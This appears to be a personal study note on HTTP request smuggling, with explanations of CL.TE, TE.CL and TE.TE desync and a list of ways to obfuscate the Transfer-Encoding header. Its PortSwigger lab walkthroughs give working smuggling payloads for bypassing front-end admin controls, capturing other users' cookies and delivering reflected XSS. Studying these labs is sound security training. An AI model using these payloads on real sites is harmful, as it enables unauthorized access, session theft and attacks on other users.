![[http-request-smuggling.svg]]
# What is HTTP request smuggling?
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## What happens in an HTTP request smuggling attack?
Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers. This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.

When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple; HTTP requests are sent one after another, and the receiving server has to determine where one request ends and the next one begins:
![[forwarding-http-requests-to-back-end-server.svg]]
In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:
![[smuggling-http-request-to-back-end-server.svg]]
Here, the attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is effectively prepended to the next request, and so can interfere with the way the application processes that request.
## How do HTTP request smuggling vulnerabilities arise?
Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request ends: the `Content-Length` header and the `Transfer-Encoding` header.
1. The `Content-Length` header is straightforward: it specifies the length of the message body in bytes. For example:
```ad-example
title: Request using content-length
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
2. The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes **(expressed in hexadecimal)**, followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size **zero**. For example:
```ad-example
title: Request using Transfer-Encoding
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```
You need to include the trailing sequence `\r\n\r\n` following the final `0` to end the TE request

> The specification attempts to prevent this problem by stating that if both the `Content-Length` and `Transfer-Encoding` headers are present, then the `Content-Length` header should be ignored. {arrow}


{arrow|purple} **This might be sufficient to avoid ambiguity when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two reasons:** 
- Some servers do not support the `Transfer-Encoding` header in requests.
- Some servers that do support the `Transfer-Encoding` header can be induced not to process it if the header is obfuscated in some way.
## How to perform an HTTP request smuggling attack
Classic request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding` header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The exact way in which this is done depends on the behaviour of the two servers:
- CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
- TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
- TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
## Finding HTTP request smuggling vulnerabilities using timing techniques
The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present.

---
###### Examples to obfuscate `Transfer-Encoding` header :
- `Transfer-Encoding: xchunked`
- `Transfer-Encoding : chunked`
- `Transfer-Encoding: chunked` `Transfer-Encoding: x`
- `Transfer-Encoding:[tab]chunked`
- `[space]Transfer-Encoding: chunked`
- `X: X[\n]Transfer-Encoding: chunked`
- `Transfer-Encoding` `: chunked`

## Labs
* #Portswigger
	1. **HTTP request smuggling, confirming a CL.TE vulnerability via differential responses** #PRACTITIONER 
		try to make the request response with `404` by smuggle a bad request using CL.TE technique
	2. **HTTP request smuggling, confirming a TE.CL vulnerability via differential responses** #PRACTITIONER 
		try to make the request response with `404` by smuggle a bad request using TE.CL technique
	3. **Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability** #PRACTITIONER 
		trying to access admin panel and delete user Carlos by adding localhost as a value of the host header in the smuggled request
		 `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 139 Transfer-Encoding: chunked 0 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 10 x=`
	4. **Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability** #PRACTITIONER 
		same as the last lab but TE.CL technique
		`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 87 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`
	5. **Exploiting HTTP request smuggling to reveal front-end request rewriting** #PRACTITIONER 
		in this lab the front end server rewrite the request again and send it to the back end server so we will try to smuggle a request that make the new written request reflect on the search parameter
	6. **Exploiting HTTP request smuggling to capture other users' requests** #PRACTITIONER 
		in this lab to steal the admin cookies we post a comment in a smuggled request knowing that the victim is sending request every period of time so we will send our smuggled request and waiting the victim to send his request and because we smuggled another the request the victim request will be sent as our comment value
		`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 256 Transfer-Encoding: chunked 0 POST /post/comment HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 400 Cookie: session=your-session-token csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test`
	7. **Exploiting HTTP request smuggling to deliver reflected XSS** #PRACTITIONER 
		`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1`
	8. **HTTP request smuggling, basic CL.TE vulnerability** #PRACTITIONER
		this lab want me to send `GPOST` request but it blocks all requests but GET and POST so we will smuggle two POST requests using this request firstly
		`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G`
		and then send normal post request which will prepend `G` before post request![[Screenshot 2025-06-20 105743.png]]
	9. **HTTP request smuggling, basic TE.CL vulnerability** #PRACTITIONER 
		this lab want me to send `GPOST` request but it blocks all requests but GET and POST so we will smuggle two POST requests using this request :
		`POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 5c GPOST / HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`
		![[Screenshot 2025-06-20 112140.png]]
	10. **HTTP request smuggling, obfuscating the TE header** #PRACTITIONER 
		just try to obfuscate the `Transfer-Encoding` header by adding these header at the request
		`Transfer-Encoding: chunked`
		`Transfer-Encoding: adel`
		and then handle it as TE.CL



# NOTES
- Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture
- Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses.
- Burp Suite automatically unpacks chunked encoding to make messages easier to view and edit.
- it is possible for a single message to use both methods at once
- Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity
- The "attack" request and the "normal" request should be sent to the server using different network connections. Sending both requests through the same connection won't prove that the vulnerability exists.
- The "attack" request and the "normal" request should use the same URL and parameter names, as far as possible. This is because many modern applications route front-end requests to different back-end servers based on the URL and parameters. Using the same URL and parameters increases the chance that the requests will be processed by the same back-end server, which is essential for the attack to work.
- When testing the "normal" request to detect any interference from the "attack" request, you are in a race with any other requests that the application is receiving at the same time, including those from other users. You should send the "normal" request immediately after the "attack" request. If the application is busy, you might need to perform multiple attempts to confirm the vulnerability.
- In some applications, the front-end server functions as a load balancer, and forwards requests to different back-end systems according to some load balancing algorithm. If your "attack" and "normal" requests are forwarded to different back-end systems, then the attack will fail. This is an additional reason why you might need to try several times before a vulnerability can be confirmed.
- If your attack succeeds in interfering with a subsequent request, but this wasn't the "normal" request that you sent to detect the interference, then this means that another application user was affected by your attack. If you continue performing the test, this could have a disruptive effect on other users, and you should exercise caution.